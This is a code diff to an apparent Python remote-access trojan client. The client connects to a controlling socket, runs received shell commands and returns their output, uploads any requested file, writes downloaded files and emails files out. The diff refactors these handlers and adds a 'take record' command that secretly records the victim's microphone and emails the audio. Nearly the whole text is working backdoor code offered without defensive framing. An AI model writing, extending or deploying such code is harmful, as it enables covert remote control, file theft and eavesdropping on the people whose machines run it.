@@ -6,10 +6,68 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import pyaudio
+import wave
+import time
+
+# socket variables
+s = socket.socket()
+s.connect(('127.0.0.1', 9984))
 
 
 def file_size(path):
     return os.path.getsize(path)
+
+
+def get_file(data):
+    data = data[9: -1] + data[-1]
+    f = open(data, 'rb')
+    while True:
+        content = f.read(1024)
+        if content:
+            s.sendall(content)
+        else:
+            f.close()
+            break
+
+
+def download_file(data):
+    with open(data, 'wb')as f:
+        while True:
+            data = s.recv(1024)
+            if not data or len(data) < 1024:
+                f.write(data)
+                f.flush()
+                f.close()
+                break
+            f.write(data)
+
+
+def take_record(record_time, file_to_save):
+    p = pyaudio.PyAudio()
+
+    stream = p.open(format=pyaudio.paInt16,
+                    channels=2,
+                    rate=44100,
+                    input=True,
+                    frames_per_buffer=1024)
+
+    frames = []
+
+    for i in range(0, int(44100 / 1024 * record_time)):
+        data = stream.read(1024)
+        frames.append(data)
+
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+
+    wf = wave.open(file_to_save, 'wb')
+    wf.setnchannels(2)
+    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
+    wf.setframerate(44100)
+    wf.writeframes(b''.join(frames))
+    wf.close()
 
 
 def send_email(file_name):
@@ -59,7 +117,7 @@ def send_email(file_name):
     s.starttls()
 
     # Authentication
-    s.login(fromaddr, "Your Password")
+    s.login(fromaddr, "your password")
 
     # Converts the Multipart msg into a string
     text = msg.as_string()
@@ -71,45 +129,37 @@ def send_email(file_name):
 
 
 def client():
-    s = socket.socket()
-    s.connect(('127.0.0.1', 9984))
-
     while True:
         data = s.recv(1024).decode('utf-8')
-        if 'cmd' in data:
+        if data.startswith('cmd '):
             try:
-                data = data.replace('cmd ', '')
+                data = data[4:-1] + data[-1]
                 s.send(subprocess.check_output(data, shell=True))
             except Exception:
                 s.send(f"Error with {data} command".encode('utf-8'))
 
-        elif 'get file' in data:
-            data = data.replace('get file ', '')
-            f = open(data, 'rb')
-            while True:
-                content = f.read(1024)
-                if content:
-                    s.sendall(content)
-                else:
-                    f.close()
-                    break
+        elif data.startswith('get file '):
+            get_file(data)
 
-        elif 'send email ' in data:
-            data = data.replace('send email ', '')
+
+        elif data.startswith('send email '):
+            data = data[11:-1] + data[-1]
             send_email(data)
             s.sendall('The Email Was Sent'.encode('utf-8'))
 
-        elif 'download file ' in data:
+        elif data.startswith('download file '):
             data = s.recv(1024).decode('utf-8')
-            with open(data, 'wb')as f:
-                while True:
-                    data = s.recv(1024)
-                    if not data or len(data) < 1024:
-                        f.write(data)
-                        f.flush()
-                        f.close()
-                        break
-                    f.write(data)
+            download_file(data)
+
+        elif data.startswith('take record '):
+            data = s.recv(1024).decode('utf-8')
+            data_2 = s.recv(1024).decode('utf-8')
+            take_record(int(data), data_2)
+            send_email(data_2)
+
+
+
+
 
         else:
             s.send('The command was not found'.encode('utf-8'))
